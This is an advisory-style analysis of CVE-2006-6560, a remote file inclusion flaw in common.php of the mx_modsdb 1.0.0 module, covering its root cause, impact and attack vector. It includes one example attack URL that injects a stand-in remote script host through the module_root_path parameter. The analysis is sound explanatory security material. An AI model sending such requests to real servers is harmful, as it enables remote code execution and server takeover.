Based on the provided content, here's an analysis of CVE-2006-6560:

**Root Cause of Vulnerability:**
- The vulnerability stems from a remote file inclusion flaw in the `common.php` file of the `mx_modsdb` module, specifically version 1.0.0.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The `module_root_path` parameter within the `common.php` script is vulnerable to manipulation. Attackers can inject a URL pointing to a malicious file which the server will then execute, allowing for arbitrary code execution.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By successfully including a malicious file, an attacker can execute arbitrary code on the server. This can lead to a complete compromise of the server, including data theft, modification, and further exploitation.

**Attack Vectors:**
- The attack is carried out by sending a crafted HTTP GET request to the vulnerable `common.php` file.
- The malicious URL is injected via the `module_root_path` parameter.
- **Example Attack URL:** `http://[target]/[patH]/includes/common.php?module_root_path=http://Ev!LScr!pt.txt`

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to send HTTP requests to the vulnerable server.
- The attacker needs to have a malicious file hosted on an accessible server.
- No specific authentication or privileges are mentioned as being required for exploitation.

**Additional Notes:**
- The exploit-db entry identifies the vulnerable software as "mx\_modsdb v.1.0.0 (common.php)".
